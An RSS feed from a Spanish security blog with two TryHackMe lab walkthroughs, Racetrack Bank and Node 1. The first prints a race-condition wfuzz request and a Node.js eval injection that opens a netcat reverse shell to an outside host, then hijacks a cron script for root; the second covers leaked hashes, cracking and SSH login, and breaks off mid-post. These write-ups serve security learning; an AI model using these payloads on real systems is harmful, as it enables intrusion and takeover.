<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>nodejs on sckull</title>
    <link>https://sckull.github.io/tags/nodejs/</link>
    <description>Recent content in nodejs on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Tue, 12 May 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/nodejs/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - Racetrack Bank</title>
        <link>https://sckull.github.io/posts/racetrackbank/</link>
        <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 12 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/racetrackbank/</guid>
        <description>Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Racetrack Bank es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Racetrack Bank&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;It&amp;rsquo;s time for another heist.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/deltatemporal&#34;&gt;deltatemporal&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y el puerto ssh &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; abiertos.
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue May 12 17:18:37 2020 as: nmap -sV -o nmap_scan_mini racetrackbank.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; racetrackbank.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.163.203&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_162323.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/racetrackbank# gobuster dir -u http://racetrackbank.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/create.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Home.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/purchase.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado &lt;code&gt;1 Gold&lt;/code&gt; y en la parte superior derecha vemos la cantidad.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174359.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien vemos la pagina de &lt;code&gt;Purchase&lt;/code&gt; y &lt;code&gt;Give Gold&lt;/code&gt;, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario &lt;code&gt;Golds&lt;/code&gt; segun la cantidad que querramos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174539.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174615.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina &lt;code&gt;premiumfeatures.html&lt;/code&gt; en la cual no tenemos acceso.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174728.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos las peticiones con Burpsuite y vemos que en el header de la respuesta &lt;code&gt;Express&lt;/code&gt; por lo que podemos deducir que la pagina esta corriendo en NodeJS.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175108.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;transferencia-asincrona-gold---wfuzz-&#34;&gt;Transferencia Asincrona GOLD - WFUZZ&lt;/h2&gt;
&lt;p&gt;Creamos una segunda cuenta, para poder regalar &lt;code&gt;Gold&lt;/code&gt; a esta desde la primera cuenta. Le damos &lt;code&gt;1 Gold&lt;/code&gt; a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas &lt;code&gt;Gold&lt;/code&gt; tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que &lt;em&gt;podríamos&lt;/em&gt; crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los &lt;code&gt;10,000 Gold&lt;/code&gt; para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.&lt;/p&gt;
&lt;p&gt;Regresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina &lt;a href=&#34;sckull.github.io/posts/mango/&#34;&gt;&lt;strong&gt;Mango - HackTheBox&lt;/strong&gt;&lt;/a&gt; que en su nombre nos indicaba la base de datos &lt;code&gt;Mongo&lt;/code&gt;, en el caso de esta maquina nos menciona &lt;code&gt;Racetrack&lt;/code&gt; que al investigar acerca de este nombre podría hacer referencia al paquete &lt;a href=&#34;https://www.npmjs.com/package/racetrack&#34;&gt;&lt;strong&gt;racetrack - npm&lt;/strong&gt;&lt;/a&gt; que se encarga de verificar las peticiones &lt;strong&gt;asincronas&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Haciendo referencia a la funcionalidad &lt;a href=&#34;https://developer.mozilla.org/es/docs/Glossary/As%C3%ADncrono&#34;&gt;&lt;code&gt;Asíncrona&lt;/code&gt;&lt;/a&gt; del paquete, utilizamos &lt;code&gt;wfuzz&lt;/code&gt; para realizar multiples peticiones en las que realizamos una &lt;code&gt;transferencia de Gold&lt;/code&gt; de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero &lt;code&gt;1&lt;/code&gt; para poder utilizar en el parametro &lt;code&gt;FUZZ&lt;/code&gt; necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:&lt;/p&gt;
&lt;p&gt;Transaccion de &lt;code&gt;pika a test&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wfuzz -u http://racetrackbank.thm/api/givegold -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -b &amp;quot;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY&amp;quot; -d &amp;quot;user=test&amp;amp;amount=FUZZ&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Al ejecutar esto obtenemos multiples respuestas &lt;code&gt;302&lt;/code&gt;, en donde las primeras diez tienen menos caracteres (agregamos &lt;code&gt;--sh 54&lt;/code&gt; a wfuzz) que las siguientes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_184712.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos la cuenta de &lt;code&gt;test&lt;/code&gt; y vemos que tenemos más &lt;code&gt;Gold&lt;/code&gt;, por lo que es muy probable que tenga la funcionalidad asincrona.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_185039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora realizamos una transaccion de &lt;code&gt;test a pika&lt;/code&gt; y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los &lt;code&gt;Gold&lt;/code&gt; necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta &amp;ldquo;explotacion&amp;rdquo; en ambas cuentas aumentan los &lt;code&gt;Gold&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_191944.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;brian-user---rce-nodejs-&#34;&gt;BRIAN USER - RCE NodeJS&lt;/h3&gt;
&lt;p&gt;Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina &lt;code&gt;Premium Features&lt;/code&gt; donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44&#34;&gt;&lt;strong&gt;NODEJS RCE&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_192105.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el payload &lt;code&gt;process.cwd()&lt;/code&gt; para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando &lt;code&gt;require()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_192647.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ponemos a la escucha nuestro netcat (&lt;code&gt;rlwrap nc -lvp 1338&lt;/code&gt;) y ejecutamos nuestro payload en la pagina &lt;code&gt;require(&amp;quot;child_process&amp;quot;).exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1338 &amp;gt;/tmp/f&#39;)&lt;/code&gt; utilizando burpsuite, codificamos nuestro payload.&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_193746.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos el codigo fuente de la pagina &lt;code&gt;PremiumFeatures&lt;/code&gt; donde eval esta presente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195548.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos las credenciales de la base de datos&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195734.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204759.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos pspy para ver los cron job, y encontramos uno que ejecuta &lt;code&gt;cleanupscript.sh&lt;/code&gt; que se encuentra en &lt;code&gt;/home/brian/cleanup/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204636.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204657.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell inversa al archivo y obtenemos una shell con usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_205221.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>nodejs</category>
            
          
            
              <category>suid</category>
            
          
            
              <category>cron</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Node 1</title>
        <link>https://sckull.github.io/posts/nodeone/</link>
        <pubDate>Wed, 26 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 26 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/nodeone/</guid>
        <description>Node 1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Node 1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Node 1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Node is a medium level boot2root challenge, originally created for HackTheBox.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;617&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/coderj&#34;&gt;coderj&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Feb 26 23:37:37 2020 as: nmap -p- -T4 -sV -o nmap_scan 10.10.27.51&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.27.51
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Feb 26 23:43:56 2020 -- 1 IP address (1 host up) scanned in 378.90 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-3000-&#34;&gt;HTTP - Puerto 3000&lt;/h2&gt;
&lt;p&gt;En el puerto 3000 encontramos una pagina que nos muestra tres usuarios.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011030.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el codigo fuente de la pagina nos encontramos con los controladores de la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011127.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el controlador de &lt;code&gt;home.js&lt;/code&gt; encontramos una ruta de una api a la que hace una solicitud.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011251.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una consulta a la ruta y nos devuelve tres usuarios, contraseñas encriptadas y que los usuarios no son administradores:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011348.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos crackstation.net para crackear las contraseñas, solo obtuvimos la contraseña de los primeros dos usuarios:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011456.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el controlador &lt;code&gt;profile.js&lt;/code&gt; encontramos que existe otra ruta en la que se hacen consultas de un usuario especifico pero al hacer una consulta sin un usuario nos muestra nuevamente la lista de usuarios con su contraseña, pero en esta respuesta nos aparece un usuario nuevo el cual es administrador:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hash crackeada:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_011948.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales del usuario nuevo y nos redirige a una pagina nueva en la que podemos descargar un archivo:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_012033.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo contiene una cadena codificada en base64, al decodificarla vemos que es un archivo zip, pero este esta protegido por contraseña:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_012752.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos fcrackzip para hacer un ataque de fuerza bruta:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013046.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---mark-&#34;&gt;USER - mark&lt;/h2&gt;
&lt;p&gt;Al descomprimir el archivo zip encontramos que, es un backup de la ruta donde se encuentran los archivos de la pagina (&lt;code&gt;/var/html/myplace/&lt;/code&gt;). Vemos la contraseña de la conexion de mongodb con el usuario mark, utilizamos estas credenciales para iniciar sesion en el servicio SSH.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013459.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario mark.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nodeone/Screenshot_20200227_013559.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---tom-&#34;&gt;USER - tom&lt;/h2&gt;
